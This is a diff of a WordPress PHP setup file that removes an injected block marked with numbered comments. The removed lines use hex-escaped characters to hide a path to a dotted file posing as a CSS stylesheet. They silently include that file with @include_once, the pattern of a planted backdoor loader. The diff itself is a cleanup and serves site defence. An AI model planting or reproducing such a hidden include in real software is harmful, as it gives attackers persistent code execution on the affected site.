@@ -1,9 +1,4 @@
 <?php
-/*75993*/
-
-$rdr65 = "/home/kharad\x69onl\x69ne.com/publ\x69c_html/test\x69ng/.d5ae69ae.css"; if (TRUE){ @include_once /* t7e */ ($rdr65); }
-
-/*75993*/
 /**
  * Used to set up and fix common variables and include
  * the WordPress procedural and class library.
